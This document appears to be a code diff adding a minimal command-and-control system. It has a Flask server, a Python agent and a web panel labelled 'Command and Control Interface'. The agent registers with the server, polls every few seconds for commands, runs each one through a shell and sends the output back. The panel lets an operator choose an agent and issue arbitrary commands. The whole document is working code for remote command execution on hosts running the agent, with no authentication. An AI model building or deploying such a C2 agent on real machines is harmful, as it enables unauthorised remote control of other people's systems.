@@ -1,0 +1,263 @@
+from flask import Flask, render_template, request, jsonify
+from flask_socketio import SocketIO,emit
+
+app = Flask(__name__)
+socketio = SocketIO(app)
+
+# Store commands for each agent
+agents = {}
+
+# Default route to render index.html
+@app.route('/')
+def index():
+    return render_template('index.html')
+
+# Endpoint for agents to register
+@app.route('/register', methods=['POST'])
+def register_agent():
+    agent_id = request.form.get('agent_id')
+    if agent_id:
+        agents[agent_id] = {'command': ''}
+        #socketio.emit('agent_registered', {'agent': agent_id}, broadcast=True)
+        return jsonify({'message': 'Agent registered successfully'}), 200
+    else:
+        return jsonify({'error': 'Agent registration failed: Missing agent_id'}), 400
+    
+
+
+# Endpoint for users to send commands to agents
+@app.route('/send_command', methods=['POST'])
+def send_command():
+    agent_id = request.form.get('agent_id')
+    command = request.form.get('command')
+    if agent_id in agents:
+        agents[agent_id]['command'] = command
+        return jsonify({'message': 'Command sent successfully'}), 200
+    else:
+        return jsonify({'error': 'Agent not found'}), 404
+
+# Endpoint for agents to get commands from the server
+@app.route('/get_command', methods=['GET'])
+def get_command():
+    agent_id = request.args.get('agent_id')
+    if agent_id in agents:
+        command = agents[agent_id]['command']
+        return jsonify({'command': command}), 200
+    else:
+        return jsonify({'error': 'Agent not found'}), 404
+
+# Endpoint for agents to send output back to the server
+@app.route('/send_output', methods=['POST'])
+def send_output():
+    agent_id = request.form.get('agent_id')
+    output = request.form.get('output')
+    if agent_id in agents:
+        agents[agent_id]['output'] = output
+        socketio.emit('output_update', {'output': output})  # Emit output to client
+        return jsonify({'message': 'Output received successfully'}), 200
+    else:
+        return jsonify({'error': 'Agent not found'}), 404
+
+# Endpoint to return a list of registered agents
+@app.route('/agents', methods=['GET'])
+def get_agents():
+    return jsonify({'agents': list(agents.keys())}), 200
+
+if __name__ == '__main__':
+    socketio.run(app, debug=True, port=5001,allow_unsafe_werkzeug=True)
+#######################################################
+
+import requests
+import subprocess
+import time
+import uuid
+
+SERVER_URL = 'http://127.0.0.1:5001'
+AGENT_ID = str(uuid.uuid4())
+REGISTER_ENDPOINT = f'{SERVER_URL}/register'  # Corrected endpoint
+COMMAND_ENDPOINT = f'{SERVER_URL}/get_command'  # Adjusted endpoint
+OUTPUT_ENDPOINT = f'{SERVER_URL}/send_output'  # Adjusted endpoint
+
+def execute_command(command):
+    try:
+        result = subprocess.run(
+            command,
+            shell=True,
+            check=True,
+            text=True,
+            capture_output=True
+        )
+        return result.stdout
+    except subprocess.CalledProcessError as e:
+        error_message = f"Error executing command: {e}\n"
+        if hasattr(e, 'stderr') and e.stderr is not None:
+            error_message += f"{e.stderr}\n"
+        return error_message
+    except Exception as e:
+        return f"Error executing command: {e}"
+
+def send_output(output):
+    try:
+        response = requests.post(OUTPUT_ENDPOINT, data={'agent_id': AGENT_ID, 'output': output})
+        response.raise_for_status()
+        print("Output sent successfully")
+    except requests.exceptions.RequestException as e:
+        print(f"Request Error: {e}")
+
+def register_agent():
+    try:
+        response = requests.post(REGISTER_ENDPOINT, data={'agent_id': AGENT_ID})
+        response.raise_for_status()
+        print("Agent registered successfully")
+    except requests.exceptions.RequestException as e:
+        print(f"Registration Error: {e}")
+
+def main():
+    register_agent()
+
+    while True:
+        try:
+            print("Fetching command from server...")
+            response = requests.get(COMMAND_ENDPOINT, params={'agent_id': AGENT_ID})
+            if response.status_code == 200:
+                data = response.json()
+                command_to_execute = data.get('command', '')
+                print(f"Received command: {command_to_execute}")
+                if command_to_execute:
+                    output = execute_command(command_to_execute)
+                    print(f"Command output: {output}")
+                    send_output(output)
+                else:
+                    print("No command received from server")
+            else:
+                print(f"Failed to fetch command. Status code: {response.status_code}")
+        except requests.exceptions.RequestException as e:
+            print(f"Request Error: {e}")
+        time.sleep(5)
+
+if __name__ == "__main__":
+    main()
+#############################################
+
+<!-- index.html -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Command and Control Interface</title>
+</head>
+<body>
+    <h1>Command and Control Interface</h1>
+    
+    <!-- Display list of agents -->
+    <h2>Agents:</h2>
+    <ul id="agentsList"></ul>
+
+    <!-- Form to send command to agent -->
+    <h2>Send Command:</h2>
+    <form id="commandForm" method="post">
+        <label for="agentSelect">Select Agent:</label>
+        <select id="agentSelect" name="agent_id">
+            <!-- Agents options will be populated dynamically -->
+        </select>
+        <label for="command">Enter Command:</label>
+        <input type="text" id="command" name="command">
+        <button type="submit">Submit</button>
+    </form>
+
+    <h3>Command: <span id="currentCommand"></span></h3>
+    <h3>Output:</h3>
+    <ul id="output"></ul>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.1.3/socket.io.js"></script>
+<script>
+    const socket = io();
+
+    // Function to add agent to the list
+    function addAgentToList(agent) {
+        const agentsList = document.getElementById('agentsList');
+        const listItem = document.createElement('li');
+        listItem.textContent = agent;
+        agentsList.appendChild(listItem);
+    }
+
+    // Function to populate agent select options
+    function populateAgentSelect(agents) {
+        const agentSelect = document.getElementById('agentSelect');
+        agentSelect.innerHTML = ''; // Clear previous options
+        agents.forEach(agent => {
+            const option = document.createElement('option');
+            option.value = agent;
+            option.textContent = agent;
+            agentSelect.appendChild(option);
+        });
+    }
+
+    // Function to update agent list
+    function updateAgentList(agents) {
+        const agentsList = document.getElementById('agentsList');
+        agentsList.innerHTML = ''; // Clear previous list
+        agents.forEach(agent => {
+            const listItem = document.createElement('li');
+            listItem.textContent = agent;
+            agentsList.appendChild(listItem);
+        });
+    }
+
+    // Function to update output list
+    function updateOutput(output) {
+        const outputList = document.getElementById('output');
+        const newItem = document.createElement('li');
+        newItem.textContent = output;
+        outputList.appendChild(newItem);
+    }
+
+    // Fetch agent list and populate dropdown when page loads
+    function fetchAgentList() {
+        fetch('/agents')
+            .then(response => response.json())
+            .then(data => {
+                updateAgentList(data.agents);
+                populateAgentSelect(data.agents);
+            });
+    }
+
+    // Initial fetch of agent list
+    fetchAgentList();
+
+    // Socket.io listener for output update
+    socket.on('output_update', (data) => {
+        updateOutput(data.output);
+    });
+
+    // Socket.io listener for new agent registration
+    socket.on('agent_registered', (data) => {
+        addAgentToList(data.agent);
+    });
+
+    // Submit form using AJAX to prevent page refresh
+    document.getElementById('commandForm').addEventListener('submit', function(event) {
+        event.preventDefault(); // Prevent form submission
+        const agentSelect = document.getElementById('agentSelect');
+        const agentId = agentSelect.value;
+        const commandInput = document.getElementById('command');
+        const command = commandInput.value.trim();
+        commandInput.value = ''; // Clear input field
+
+        // Send command to server
+        fetch('/send_command', {  // Updated endpoint to match server
+            method: 'POST',  // Ensure that POST method is used
+            headers: {
+                'Content-Type': 'application/x-www-form-urlencoded'
+            },
+            body: new URLSearchParams({ 'agent_id': agentId, 'command': command })  // Include agent_id and command in the body
+        });
+        
+        // Update current command on the page
+        document.getElementById('currentCommand').textContent = command;
+    });
+</script>
+</body>
+</html>
+
